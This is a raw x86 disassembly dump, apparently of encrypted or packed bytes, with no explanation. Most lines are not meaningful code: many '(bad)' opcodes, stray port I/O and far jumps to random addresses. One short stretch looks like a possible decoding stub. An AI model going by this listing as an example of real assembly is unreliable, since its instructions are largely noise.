  40f36c:	mov    edi,DWORD PTR ds:0xa9966f5d
  40f372:	out    0x7,al
  40f374:	xor    DWORD PTR [eax+0x376e518a],0x19
  40f37b:	enter  0x7cc9,0x43
  40f37f:	les    ebp,FWORD PTR [ebx+0x960dcd6]
  40f385:	ds mov bl,0x4
  40f388:	and    ebp,DWORD PTR [eax-0x3183da0d]
  40f38e:	icebp  
  40f38f:	pop    ebp
  40f390:	idiv   BYTE PTR [ecx+0x65]
  40f393:	add    ch,bl
  40f395:	sti    
  40f396:	scas   al,BYTE PTR es:[edi]
  40f397:	nop
  40f398:	xchg   ebx,eax
  40f399:	stos   DWORD PTR es:[edi],eax
  40f39a:	cmc    
  40f39b:	cmp    eax,edx
  40f39d:	retf   0x4c6d
  40f3a0:	pop    edi
  40f3a1:	add    al,0xc4
  40f3a3:	out    dx,al
  40f3a4:	repnz fbld TBYTE PTR [esi+esi*4-0x16]
  40f3a9:	pop    edi
  40f3aa:	or     eax,0xe0978537
  40f3af:	int3   
  40f3b0:	and    DWORD PTR [eax],0x9bcf5c0a
  40f3b6:	pop    ebx
  40f3b7:	aaa    
  40f3b8:	js     0x40f3a6
  40f3ba:	ret    0x705d
  40f3bd:	sbb    al,BYTE PTR [eax]
  40f3bf:	adc    eax,0x34724ca4
  40f3c4:	out    dx,eax
  40f3c5:	cmp    DWORD PTR [edx],ebp
  40f3c7:	xor    BYTE PTR [ebp-0x3367103a],bh
  40f3cd:	fdiv   QWORD PTR [ecx-0x51e448ff]
  40f3d3:	retf   
  40f3d4:	in     eax,dx
  40f3d5:	inc    esi
  40f3d6:	sbb    al,0xd0
  40f3d8:	int    0x15
  40f3da:	div    DWORD PTR [edi-0x6def96d6]
  40f3e0:	lds    ebx,FWORD PTR [ecx-0x176fd27e]
  40f3e6:	inc    edi
  40f3e7:	or     ch,BYTE PTR [esi+eax*1]
  40f3ea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f3eb:	out    0x8,eax
  40f3ed:	ror    edx,cl
  40f3ef:	and    al,0x1b
  40f3f1:	mov    al,0xcb
  40f3f3:	pop    ebp
  40f3f4:	mov    esi,0x876e4aea
  40f3f9:	dec    edx
  40f3fa:	push   edi
  40f3fb:	nop
  40f3fc:	xchg   esp,eax
  40f3fd:	in     eax,0x89
  40f3ff:	imul   eax,DWORD PTR [ebx-0x34],0x5c
  40f403:	loopne 0x40f3ca
  40f405:	dec    esi
  40f406:	sti    
  40f407:	ret    
  40f408:	jge    0x40f42f
  40f40a:	sub    DWORD PTR [esi],edx
  40f40c:	fsub   st(6),st
  40f40e:	inc    ebp
  40f40f:	jno    0x40f3d5
  40f411:	in     al,0xa3
  40f413:	mov    ch,0x74
  40f415:	pushf  
  40f416:	xchg   ecx,eax
  40f417:	adc    cl,BYTE PTR [ebx+0x59aa3add]
  40f41d:	jp     0x40f3a5
  40f41f:	push   es
  40f420:	int    0xe8
  40f422:	xlat   BYTE PTR ds:[ebx]
  40f423:	jbe    0x40f47a
  40f425:	jg     0x40f440
  40f427:	in     al,dx
  40f428:	mov    dh,0xf4
  40f42a:	add    BYTE PTR [edx],ah
  40f42c:	jmp    0x40f3f1
  40f42e:	in     eax,0xab
  40f430:	sbb    dl,BYTE PTR [ebp-0x37]
  40f433:	(bad)  
  40f435:	lock and al,0x21
  40f438:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f439:	dec    edi
  40f43a:	shl    DWORD PTR [esi-0x4c7571ce],1
  40f440:	in     al,0xde
  40f442:	pusha  
  40f443:	push   es
  40f444:	mov    dh,BYTE PTR [edi-0x7a]
  40f447:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f448:	scas   al,BYTE PTR es:[edi]
  40f449:	fwait
  40f44a:	out    dx,al
  40f44b:	outs   dx,DWORD PTR ds:[esi]
  40f44d:	sti    
  40f44e:	mov    ch,0xe0
  40f450:	sub    al,0x9f
  40f452:	jae    0x40f438
  40f454:	mov    al,ds:0x10cfbaf5
  40f459:	retf   
  40f45a:	xor    ch,BYTE PTR [ecx]
  40f45c:	cld    
  40f45d:	push   es
  40f45e:	int3   
  40f45f:	mov    ecx,0x29f2b97d
  40f464:	sbb    DWORD PTR [edi+eiz*4+0x6c],0xf357211c
  40f46c:	xchg   ecx,eax
  40f46d:	std    
  40f46e:	sub    eax,0x440d0de4
  40f473:	test   esp,eax
  40f475:	test   ebx,edi
  40f477:	fisubr DWORD PTR [ebp+edx*4+0x50]
  40f47b:	test   eax,0xb328ff6c
  40f480:	mov    bl,BYTE PTR [ebp+0xe]
  40f483:	dec    esi
  40f484:	dec    ecx
  40f485:	dec    esp
  40f486:	bound  esi,QWORD PTR [ebp-0x1c]
  40f489:	stc    
  40f48a:	adc    al,0x3a
  40f48c:	daa    
  40f48d:	push   DWORD PTR [eax+0x7af5ba98]
  40f493:	inc    eax
  40f494:	mov    edx,DWORD PTR [edx]
  40f496:	mov    esi,DWORD PTR ds:0x421c92
  40f49c:	add    DWORD PTR [edx],esi
  40f49e:	mov    esi,DWORD PTR [ebp+0x8]
  40f4a1:	mov    edx,DWORD PTR ds:0x421c92
  40f4a7:	xor    esi,0x7510893
  40f4ad:	add    esi,0x3272db
  40f4b3:	jmp    0x411847
  40f4b8:	jae    0x40f43a
  40f4ba:	mov    ah,0xa9
  40f4bc:	xchg   ebx,eax
  40f4bd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f4be:	jecxz  0x40f52c
  40f4c0:	pop    esi
  40f4c1:	sbb    ch,BYTE PTR [ebp-0x65]
  40f4c4:	rcl    BYTE PTR [ebx-0x4e],0xe8
  40f4c8:	dec    ebx
  40f4c9:	lea    esp,[edx+0x62]
  40f4cc:	jmp    0x40f52d
  40f4ce:	bound  esp,QWORD PTR [edx-0x3d]
  40f4d1:	int    0xff
  40f4d3:	imul   BYTE PTR gs:[ecx]
  40f4d6:	mov    BYTE PTR ss:[ebx+0xdf9cbfe],cl
  40f4dd:	loopne 0x40f4f5
  40f4df:	out    dx,al
  40f4e0:	outs   dx,DWORD PTR ds:[esi]
  40f4e1:	add    DWORD PTR [edx],edx
  40f4e3:	jb     0x40f4ce
  40f4e5:	pusha  
  40f4e6:	adc    DWORD PTR [esi+0x44],ebx
  40f4e9:	or     al,0x92
  40f4eb:	cmp    al,0x32
  40f4ed:	loopne 0x40f548
  40f4ef:	mov    edi,0xa6dc8771
  40f4f4:	sbb    BYTE PTR [esp+eax*4],dh
  40f4f7:	sbb    ebp,DWORD PTR [edi]
  40f4f9:	sbb    eax,0x8d054c64
  40f4fe:	dec    esp
  40f4ff:	push   ebp
  40f500:	mov    ch,al
  40f502:	mov    ds:0xfbe74cc3,eax
  40f507:	aad    0x7b
  40f509:	add    al,0x6b
  40f50b:	push   ebx
  40f50c:	pop    es
  40f50d:	scas   al,BYTE PTR es:[edi]
  40f50e:	outs   dx,DWORD PTR ds:[esi]
  40f50f:	(bad)  
  40f510:	ins    DWORD PTR es:[edi],dx
  40f511:	mov    WORD PTR [edi+0xc],es
  40f514:	outs   dx,BYTE PTR ds:[esi]
  40f515:	or     al,BYTE PTR [esi]
  40f517:	gs das 
  40f519:	lods   al,BYTE PTR ds:[esi]
  40f51a:	addr16 jne 0x40f596
  40f51d:	enter  0x2d0b,0x17
  40f521:	je     0x40f563
  40f523:	sbb    BYTE PTR [ebx-0x75],ch
  40f526:	add    DWORD PTR [ebp-0x4e9316ea],esp
  40f52c:	gs test eax,0xabc5fdcb
  40f532:	test   al,0x36
  40f534:	iret   
  40f535:	fiadd  WORD PTR [edx]
  40f537:	shr    DWORD PTR [ebx+eiz*4+0x233291ac],cl
  40f53e:	outs   dx,BYTE PTR ds:[esi]
  40f53f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f540:	aam    0xe4
  40f542:	pop    ecx
  40f543:	retf   
  40f544:	push   ds
  40f545:	ret    0x57a5
  40f548:	cmp    DWORD PTR [ebp+0x434f2b29],esi
  40f54e:	jle    0x40f4d2
  40f550:	mov    edx,0xc27b13a
  40f555:	mov    dl,0x9
  40f557:	mov    dh,0xaa
  40f559:	sub    eax,0x603a614
  40f55e:	pop    ss
  40f55f:	cmp    ch,BYTE PTR [ebp+edi*1-0x3be454e5]
  40f566:	and    ah,0x9c
  40f569:	jg     0x40f504
  40f56b:	cmp    DWORD PTR [ebx-0x55],ebp
  40f56e:	jl     0x40f5b7
  40f570:	gs jns 0x40f4fe
  40f573:	sub    edi,0xffffffc1
  40f576:	lahf   
  40f577:	sub    BYTE PTR [edx-0x227b4814],ah
  40f57d:	iret   
  40f57e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f57f:	cmp    BYTE PTR [edx+0x1f],dl
  40f582:	mov    WORD PTR [ecx],ss
  40f584:	out    0x44,al
  40f586:	icebp  
  40f587:	dec    eax
  40f588:	pusha  
  40f589:	or     bl,ch
  40f58b:	xchg   edi,eax
  40f58c:	div    DWORD PTR [edx]
  40f58e:	push   edx
  40f58f:	cmp    edx,DWORD PTR [eax]
  40f591:	sti    
  40f592:	pop    ebx
  40f593:	mov    al,0x19
  40f595:	(bad)  
  40f596:	adc    eax,0x150eca28
  40f59b:	lahf   
  40f59c:	and    DWORD PTR [ebx+0x1],esp
  40f59f:	push   eax
  40f5a0:	sbb    eax,0x1ed25467
  40f5a5:	fnstsw WORD PTR [edi+0x72103b9e]
  40f5ab:	mov    dl,0x73
  40f5ad:	fimul  WORD PTR [ebp+0x23543ada]
  40f5b3:	push   ds
  40f5b4:	or     cl,BYTE PTR [ebx+eiz*8+0x3d]
  40f5b8:	and    bl,BYTE PTR [eax+eax*2-0x24]
  40f5bc:	rol    ebx,1
  40f5be:	jbe    0x40f5e7
  40f5c0:	out    0xb0,eax
  40f5c2:	adc    ah,BYTE PTR [edi-0x907b96f]
  40f5c8:	cld    
  40f5c9:	mov    ch,0x13
  40f5cb:	ja     0x40f62f
  40f5cd:	jnp    0x40f623
  40f5cf:	test   al,0xb8
  40f5d1:	leave  
  40f5d2:	cmp    ebp,ebp
  40f5d4:	lea    ebp,[edi]
  40f5d6:	stos   BYTE PTR es:[edi],al
  40f5d7:	mov    bh,0xc0
  40f5d9:	mov    WORD PTR [ebp-0x6e257f5d],cs
  40f5df:	mov    edi,0x2580e129
  40f5e4:	push   esp
  40f5e5:	lods   eax,DWORD PTR ds:[esi]
  40f5e6:	test   DWORD PTR [eax-0x5],esi
  40f5e9:	jl     0x40f651
  40f5eb:	mov    edx,0x939be45c
  40f5f0:	and    DWORD PTR [eax],eax
  40f5f2:	cdq    
  40f5f3:	sbb    DWORD PTR [edx+0x5ef45e89],esi
  40f5f9:	in     al,0xc1
  40f5fb:	cli    
  40f5fc:	mov    al,0x1e
  40f5fe:	cmp    al,0x9d
  40f600:	or     ebp,esp
  40f602:	xor    DWORD PTR [edx+0x5c],ebp
  40f605:	push   0x4b644e60
  40f60a:	pop    es
  40f60b:	cmc    
  40f60c:	xchg   edx,eax
  40f60d:	fmul   DWORD PTR [eax+ebx*8+0x355bc2e7]
  40f614:	(bad)  
  40f615:	and    DWORD PTR [edx-0x45],ebp
  40f618:	mov    esi,0x347bd171
  40f61d:	jp     0x40f60c
  40f61f:	shl    DWORD PTR [ebx+0x3caa9dc8],1
  40f625:	pop    ebp
  40f626:	aad    0x63
  40f628:	pop    esi
  40f629:	mov    cl,0x4a
  40f62b:	jo     0x40f638
  40f62d:	inc    esp
  40f62e:	loopne 0x40f64f
  40f630:	xlat   BYTE PTR ds:[ebx]
  40f631:	idiv   DWORD PTR [ecx-0x2c]
  40f634:	pop    ebx
  40f635:	test   al,0xaa
  40f637:	jb     0x40f5f9
  40f639:	push   0x733c2ff6
  40f63e:	and    BYTE PTR [edx-0x2485ab1f],al
  40f644:	adc    dh,0xea
  40f647:	lea    ecx,[esi]
  40f649:	adc    al,0x18
  40f64b:	jbe    0x40f6c1
  40f64d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f64e:	and    BYTE PTR [edi+edi*8+0x14d89d6d],0x39
  40f656:	push   ebp
  40f657:	mov    ebx,0x16938516
  40f65c:	adc    ch,BYTE PTR [eax]
  40f65e:	cmc    
  40f65f:	int    0x92
  40f661:	push   cs
  40f662:	and    BYTE PTR [ecx+0x31162bc0],dh
  40f668:	xchg   BYTE PTR [ebx],dh
  40f66a:	cmp    DWORD PTR [ebx+0x6],eax
  40f66d:	add    edx,DWORD PTR [edx+0xc99bd22]
  40f673:	stos   BYTE PTR es:[edi],al
  40f674:	cmp    BYTE PTR [edi+edx*2-0xe390e1e],bl
  40f67b:	or     al,0xbe
  40f67d:	pop    esi
  40f67e:	mov    al,ds:0x426cdd09
  40f683:	xchg   esi,eax
  40f684:	inc    edi
  40f685:	mov    dh,0x80
  40f687:	rcl    BYTE PTR [edx-0xc1f842a],0x18
  40f68e:	call   0xb371:0x6c5e0274
  40f695:	cmp    ecx,ecx
  40f697:	dec    eax
  40f698:	cmp    esi,DWORD PTR [eax]
  40f69a:	loope  0x40f6c4
  40f69c:	adc    esi,eax
  40f69e:	mov    al,BYTE PTR [eax-0x79]
  40f6a1:	cld    
  40f6a2:	pop    esi
  40f6a3:	stos   BYTE PTR es:[edi],al
  40f6a4:	shl    BYTE PTR [ecx+0xb38afe5],0xa2
  40f6ab:	rcl    BYTE PTR [bx+di-0x1e7d],0x7c
  40f6b1:	jne    0x40f6d3
  40f6b3:	xchg   esi,eax
  40f6b4:	push   DWORD PTR [ebx-0x12]
  40f6b7:	test   BYTE PTR [eax+eiz*8-0x23],0x9e
  40f6bc:	xor    ch,0xf5
  40f6bf:	js     0x40f6af
  40f6c1:	fs push ecx
  40f6c3:	out    dx,al
  40f6c4:	ins    DWORD PTR es:[edi],dx
  40f6c5:	mov    ?,WORD PTR [esp+esi*8-0x8]
  40f6c9:	push   es
  40f6ca:	pop    eax
  40f6cb:	out    0x52,al
  40f6cd:	push   eax
  40f6ce:	out    dx,eax
  40f6cf:	fisubr DWORD PTR [edx+0x1de59d83]
  40f6d5:	cmp    DWORD PTR [ebx+0x1b],esp
  40f6d8:	xor    DWORD PTR [edi+esi*8],esp
  40f6db:	xchg   BYTE PTR [edi],dl
  40f6dd:	(bad)  
  40f6de:	mov    ah,0xe3
  40f6e0:	aam    0x85
  40f6e2:	xor    ch,BYTE PTR [ecx]
  40f6e4:	repz cmc 
  40f6e6:	xchg   ecx,eax
  40f6e7:	push   es
  40f6e8:	push   ss
  40f6e9:	stos   BYTE PTR es:[edi],al
  40f6ea:	push   ebx
  40f6eb:	mov    eax,0x298c75c1
  40f6f0:	lea    ecx,[ebp-0x76]
  40f6f3:	xor    al,0xbc
  40f6f5:	retf   
  40f6f6:	bound  eax,QWORD PTR [esi+0x6e]
  40f6f9:	out    dx,eax
  40f6fa:	cmp    DWORD PTR [edi+0xf],edx
  40f6fd:	and    DWORD PTR [edi-0x6d],eax
  40f700:	mov    esi,0x68c1f4f6
  40f705:	mov    ah,al
  40f707:	fucomp st(4)
  40f709:	sbb    ch,BYTE PTR [edi+0x75]
  40f70c:	mov    bh,0x43
  40f70e:	pop    edi
  40f70f:	mov    eax,ds:0x766dd6ac
  40f714:	inc    esi
  40f715:	jp     0x40f69a
  40f717:	mov    al,0xf6
  40f719:	or     dh,BYTE PTR [esi]
  40f71b:	xor    DWORD PTR [ebp+0x7ad90c08],edi
  40f721:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f722:	mov    dl,0x9f
  40f724:	scas   eax,DWORD PTR es:[edi]
  40f725:	fcom   QWORD PTR [ebp-0x7fc40251]
  40f72b:	dec    esi
  40f72c:	xor    edi,DWORD PTR [edi+edi*4]
  40f72f:	adc    DWORD PTR [esi+0xeef4305],ebp
  40f735:	sub    esi,DWORD PTR [ebx+0x42]
  40f738:	lods   eax,DWORD PTR ds:[esi]
  40f739:	sar    dh,0xb8
  40f73c:	fsub   DWORD PTR [ebx]
  40f73e:	and    al,0x90
  40f740:	out    dx,eax
  40f741:	shl    bl,cl
  40f743:	retf   
  40f744:	fist   WORD PTR [edi-0x25114fbc]
  40f74a:	mov    DWORD PTR [edx+0x20],ecx
  40f74d:	dec    eax
  40f74e:	jmp    0xe8e1:0x74cb21b8
  40f755:	pop    ecx
  40f756:	mov    ecx,0x986bab70
  40f75b:	pop    ecx
  40f75c:	inc    ecx
  40f75d:	ins    BYTE PTR es:[edi],dx
  40f75e:	les    edx,FWORD PTR [ebp-0x12]
  40f761:	push   ebx
  40f762:	xchg   BYTE PTR [esi+0x553c147e],dh
  40f768:	aam    0x51
  40f76a:	adc    eax,0xb26ce268
  40f76f:	xlat   BYTE PTR ds:[ebx]
  40f770:	pop    edx
  40f771:	jo     0x40f7d5
  40f773:	out    0xdd,al
  40f775:	scas   al,BYTE PTR es:[edi]
  40f776:	ret    
  40f777:	dec    edi
  40f778:	sahf   
  40f779:	jbe    0x40f715
  40f77b:	cli    
  40f77c:	aam    0x45
  40f77e:	mov    bh,0x55
  40f780:	pop    esi
  40f781:	rcl    ebp,cl
  40f783:	out    0x83,eax
  40f785:	mov    cl,0xf2
  40f787:	test   al,0xf
  40f789:	xchg   esi,eax
  40f78a:	or     esp,DWORD PTR [eax]
  40f78c:	push   ecx
  40f78d:	xchg   ebx,eax
  40f78e:	or     eax,DWORD PTR [eax]
  40f790:	cmp    eax,0xfe59e29f
  40f795:	sub    DWORD PTR [edx],ebx
  40f797:	mov    eax,0xab679fd1
  40f79c:	pop    eax
  40f79d:	in     eax,0xee
  40f79f:	jecxz  0x40f81d
  40f7a1:	addr16 das 
  40f7a3:	xchg   esi,eax
  40f7a4:	mov    al,0x6f
  40f7a6:	ins    DWORD PTR es:[edi],dx
  40f7a7:	push   edi
  40f7a8:	pop    esp
  40f7a9:	and    ecx,DWORD PTR [edx+ebp*4+0x237b66c1]
  40f7b0:	inc    edx
  40f7b1:	gs add al,0xd7
  40f7b4:	fmul   DWORD PTR [eax+0x5c]
  40f7b7:	or     al,0x41
  40f7b9:	mov    bl,0x59
  40f7bb:	push   esi
  40f7bc:	pusha  
  40f7bd:	mov    bh,0xe1
  40f7bf:	inc    edi
  40f7c0:	adc    edi,DWORD PTR [edi]
  40f7c2:	loop   0x40f7a2
  40f7c4:	push   esp
  40f7c5:	test   al,0x75
  40f7c7:	xor    al,0x7b
  40f7c9:	(bad)  
  40f7ca:	es mov bl,0x1e
  40f7cd:	pop    edx
  40f7ce:	leave  
  40f7cf:	mov    esi,0xe0e9830b
  40f7d4:	push   eax
  40f7d5:	mov    esi,0x24936986
  40f7da:	cwde   
  40f7db:	out    dx,eax
  40f7dc:	mov    esi,0xb95f88b3
  40f7e1:	adc    eax,DWORD PTR [ebx+0x1a25dcc0]
  40f7e7:	es dec ecx
  40f7e9:	and    ebp,edi
  40f7eb:	jo     0x40f7a0
  40f7ed:	daa    
  40f7ee:	fsubr  DWORD PTR [ecx+0x540bf56d]
  40f7f4:	jge    0x40f7c3
  40f7f6:	call   0xa06026bd
  40f7fb:	enter  0x5922,0x7
  40f7ff:	jle    0x40f80c
  40f801:	mov    BYTE PTR [ecx+0x4f8c881d],al
  40f807:	xchg   DWORD PTR [ecx-0x3c],ecx
  40f80a:	jle    0x40f7c8
  40f80c:	in     eax,0x50
  40f80e:	aad    0xb8
  40f810:	pushf  
  40f811:	or     DWORD PTR [ebx],0x6d63f093
  40f817:	scas   eax,DWORD PTR es:[edi]
  40f818:	xchg   edx,eax
  40f819:	xchg   dh,dl
  40f81b:	cmp    esi,DWORD PTR [eax]
  40f81d:	inc    edx
  40f81e:	(bad)  
  40f820:	mov    edx,0x390cf787
  40f825:	or     eax,0x3988a001
  40f82a:	xchg   edx,eax
  40f82b:	mov    edi,0xc938992b
  40f830:	(bad)  [esi+0x8]
  40f833:	mov    edi,0xa64bd8de
  40f838:	es inc edx
  40f83a:	mov    bl,0x1b
  40f83c:	hlt    
  40f83d:	mov    ecx,DWORD PTR [ebx]
  40f83f:	xor    esi,DWORD PTR [eax-0x56]
  40f842:	sbb    eax,0xa542dcb2
  40f847:	mov    ebx,?
  40f849:	mov    ah,0xe6
  40f84b:	test   ebp,edx
  40f84d:	push   ecx
  40f84f:	mov    ebx,esi
  40f851:	ficom  DWORD PTR [eax-0x32]
  40f854:	adc    edx,DWORD PTR [edx+ebp*2]
  40f857:	jo     0x40f851
  40f859:	add    BYTE PTR [ecx],dl
  40f85b:	out    0xd,eax
  40f85d:	xor    edi,DWORD PTR [ecx+0x51a6e31e]
  40f863:	push   ds
  40f864:	into   
  40f865:	sbb    eax,0x6df05fe4
  40f86a:	or     eax,0x5b3e033f
  40f86f:	rol    DWORD PTR [ebx-0x387c5ef7],0xa6
  40f876:	cdq    
  40f877:	(bad)  
  40f878:	cmp    BYTE PTR [edi+0x44b9e9e6],dl
  40f87e:	sub    DWORD PTR [edx],0xffffffb8
  40f881:	dec    ecx
  40f882:	push   fs
  40f884:	push   esi
  40f885:	xchg   BYTE PTR [esi+ebp*2-0x7e9f1d3d],bh
  40f88c:	inc    edx
  40f88d:	pop    ecx
  40f88e:	mov    edi,esp
  40f890:	clc    
  40f891:	pop    esp
  40f892:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f893:	jno    0x40f8d2
  40f895:	aam    0x65
  40f897:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f899:	mov    esi,0x35e917fa
  40f89e:	pop    eax
  40f89f:	pop    edi
  40f8a0:	ret    0xaed4
  40f8a3:	and    bh,dl
  40f8a5:	mov    edi,esp
  40f8a7:	aaa    
  40f8a8:	cli    
  40f8a9:	dec    ebp
  40f8aa:	sub    eax,0x8e5cc0e8
  40f8af:	push   ds
  40f8b0:	sbb    esp,esi
  40f8b2:	stc    
  40f8b3:	adc    eax,0xf2aba3a
  40f8b8:	loope  0x40f906
  40f8ba:	shl    ebx,cl
  40f8bc:	xchg   ecx,eax
  40f8bd:	lods   eax,DWORD PTR ds:[esi]
  40f8be:	es icebp 
  40f8c0:	jb     0x40f8dc
  40f8c2:	mov    bh,0x6d
  40f8c4:	or     edi,DWORD PTR [ebp-0x44]
  40f8c7:	add    DWORD PTR [ecx-0x387ef8f7],edi
  40f8cd:	dec    ebx
  40f8ce:	iret   
  40f8cf:	jp     0x40f892
  40f8d1:	shl    BYTE PTR [esi+esi*8],cl
  40f8d4:	test   eax,0xaed23cfa
  40f8d9:	adc    BYTE PTR [edi],0x1f
  40f8dc:	sti    
  40f8dd:	jmp    0xfa48:0x8a961b7d
  40f8e4:	mov    BYTE PTR [ebp+0x1ecaa7a6],ch
  40f8ea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f8eb:	fadd   st(4),st
  40f8ed:	sbb    ecx,DWORD PTR [edi+0x62d62986]
  40f8f3:	and    ecx,DWORD PTR [eax]
  40f8f5:	cmp    eax,0x7c2ff48b
  40f8fa:	loopne 0x40f8df
  40f8fc:	mov    ebp,0x8d2a2dab
  40f901:	retf   
  40f902:	jg     0x40f96a
  40f904:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f905:	add    dl,BYTE PTR [eax+0x28]
  40f908:	cld    
  40f909:	int    0xa4
  40f90b:	out    dx,eax
  40f90c:	or     DWORD PTR [edi+0xf],ebp
  40f90f:	jmp    0x40f943
  40f911:	loopne 0x40f8a7
  40f913:	sbb    BYTE PTR [ebx+0x1b1d8214],ah
  40f919:	ret    0xd8aa
  40f91c:	dec    ecx
  40f91d:	test   al,0xbe
  40f91f:	inc    ebp
  40f920:	out    dx,al
  40f921:	ret    
  40f922:	mov    ds,WORD PTR [edx-0x4965674]
  40f928:	xchg   BYTE PTR [edx],ah
  40f92a:	fmul   DWORD PTR [eax-0x54e06dff]
  40f930:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f931:	pushf  
  40f932:	sbb    DWORD PTR [esp+ebx*2],ebx
  40f935:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f936:	scas   al,BYTE PTR es:[edi]
  40f937:	adc    bh,ah
  40f939:	push   cs
  40f93a:	das    
  40f93b:	out    0x5a,al
  40f93d:	mov    WORD PTR [esi-0x227ffacc],ss
  40f943:	(bad)  
  40f944:	repz dec edi
  40f946:	mov    BYTE PTR [edi-0x34],al
  40f949:	(bad)  
  40f94a:	pop    esp
  40f94b:	pushf  
  40f94c:	sbb    esp,edx
  40f94e:	gs add ch,ah
  40f951:	loopne 0x40f9b5
  40f953:	daa    
  40f954:	mov    WORD PTR [ecx],fs
  40f956:	ret    
  40f957:	sbb    ecx,ebp
  40f959:	sub    DWORD PTR [edi],esi
  40f95b:	inc    edx
  40f95c:	inc    edi
  40f95d:	stos   BYTE PTR es:[edi],al
  40f95e:	push   ds
  40f95f:	xor    BYTE PTR [eax+0x51],dh
  40f962:	stos   WORD PTR es:[edi],ax
  40f964:	ja     0x40f96a
  40f966:	fistp  DWORD PTR [ecx-0x15052897]
  40f96c:	(bad)  
  40f96d:	sahf   
  40f96e:	imul   ebx,DWORD PTR [eax-0x6fe1f2e8],0xffffff9c
  40f975:	mov    edx,DWORD PTR [esi-0x7e]
  40f978:	pop    eax
  40f979:	mov    al,ds:0x6977060d
  40f97e:	jg     0x40f916
  40f980:	(bad)  
  40f981:	in     al,0x7
  40f983:	jmp    0xdcdc:0xe2cf8f52
  40f98a:	pop    esi
  40f98b:	sub    BYTE PTR [ecx+0x4bd364fa],0x30
  40f992:	cmc    
  40f993:	adc    BYTE PTR [edi-0x73],bh
  40f996:	xchg   edx,eax
  40f997:	sbb    BYTE PTR es:[eax-0x3db68d48],bl
  40f99e:	ret    
  40f99f:	scas   eax,DWORD PTR es:[edi]
  40f9a0:	rol    DWORD PTR [edi+eiz*2],0xe2
  40f9a4:	lods   al,BYTE PTR ds:[esi]
  40f9a5:	sub    DWORD PTR [eax+0x59],0xcb0d17cc
  40f9ac:	push   ebx
  40f9ad:	cdq    
  40f9ae:	push   esp
  40f9af:	(bad)  
  40f9b1:	sbb    edi,ecx
  40f9b3:	sbb    dh,BYTE PTR [edi+0x1e92b97a]
  40f9b9:	add    al,0x43
  40f9bb:	jne    0x40f93f
  40f9bd:	mov    ah,0x41
  40f9bf:	cmc    
  40f9c0:	pop    esp
  40f9c1:	xchg   DWORD PTR [edi+0x3c4ebc1],esp
  40f9c7:	add    BYTE PTR [ecx+eiz*1],bl
  40f9ca:	sbb    eax,0x1e4e2e42
  40f9cf:	mov    al,0x66
  40f9d1:	jno    0x40fa1d
  40f9d3:	inc    edx
  40f9d4:	loopne 0x40fa2e
  40f9d6:	(bad)  
  40f9d7:	stc    
  40f9d8:	and    al,0x7a
  40f9db:	mov    ecx,0xd18ab2c9
  40f9e0:	mov    ch,0xc0
  40f9e2:	stc    
  40f9e3:	nop
  40f9e4:	inc    esi
  40f9e5:	inc    edx
  40f9e6:	adc    bl,ch
  40f9e8:	dec    esp
  40f9e9:	fst    DWORD PTR [ebp+0x32]
  40f9ec:	and    DWORD PTR cs:[eax-0x7d297f2f],esi
  40f9f3:	call   0x9aa17041
  40f9f8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f9f9:	add    edi,DWORD PTR [ebp+0x63]
  40f9fc:	inc    ebx
  40f9fd:	and    al,0x35
  40f9ff:	and    edx,0xa
  40fa02:	ret    
  40fa03:	jg     0x40fa67
  40fa05:	jae    0x40fa70
  40fa07:	jecxz  0x40f9b0
  40fa09:	fiadd  WORD PTR [edx]
  40fa0b:	inc    BYTE PTR [eax]
  40fa0d:	int    0xe
  40fa0f:	in     eax,dx
  40fa10:	enter  0x250d,0xab
  40fa14:	xor    BYTE PTR ds:0xc45272e9,bh
  40fa1a:	mov    ebx,0x645eb999
  40fa1f:	lods   al,BYTE PTR ds:[esi]
  40fa20:	test   DWORD PTR [ebp-0x3502cb07],ebp
  40fa26:	sbb    al,0xb5
  40fa28:	cs xor al,0x1c
  40fa2b:	mov    bh,0x25
  40fa2d:	push   edi
  40fa2e:	cmp    eax,0x2c8af016
  40fa33:	adc    DWORD PTR [eax+0x34],esi
  40fa36:	fcompp 
  40fa38:	xor    al,0xaa
  40fa3a:	jo     0x40fa4d
  40fa3c:	and    eax,0xdd6904de
  40fa41:	aas    
  40fa42:	arpl   sp,bp
  40fa44:	cdq    
  40fa45:	int    0x96
  40fa47:	mov    ds:0xeffa4a16,al
  40fa4c:	lods   al,BYTE PTR ds:[esi]
  40fa4d:	sub    DWORD PTR [edi+0xb],esi
  40fa50:	xchg   bl,bl
  40fa52:	mov    ds:0xe30df86c,al
  40fa57:	push   cs
  40fa58:	pop    ecx
  40fa59:	repz adc edx,eax
  40fa5c:	call   0xa93:0xe88e47b8
  40fa63:	mov    esp,0xe4b78232
  40fa68:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fa69:	xchg   dl,dl
  40fa6b:	ja     0x40fab2
  40fa6d:	pop    ebp
  40fa6e:	cwde   
  40fa6f:	in     al,dx
  40fa70:	inc    esi
  40fa71:	test   BYTE PTR [ecx+0x6e],ch
  40fa74:	gs (bad) 
  40fa76:	scas   al,BYTE PTR es:[edi]
  40fa77:	mov    ch,0xb7
  40fa79:	popa   
  40fa7a:	imul   edx,esi,0xffffff98
  40fa7d:	shl    dh,cl
  40fa7f:	mov    ebx,0x4e3c3d35
  40fa84:	imul   ebp,esp,0x49
  40fa87:	icebp  
  40fa88:	adc    bl,dh
  40fa8a:	popf   
  40fa8b:	adc    eax,DWORD PTR [ebp-0x113f4bdd]
  40fa91:	ror    DWORD PTR [ecx],1
  40fa93:	mov    ecx,0x561062aa
  40fa98:	xlat   BYTE PTR ds:[ebx]
  40fa99:	fsubr  st,st(5)
  40fa9b:	sub    esi,edx
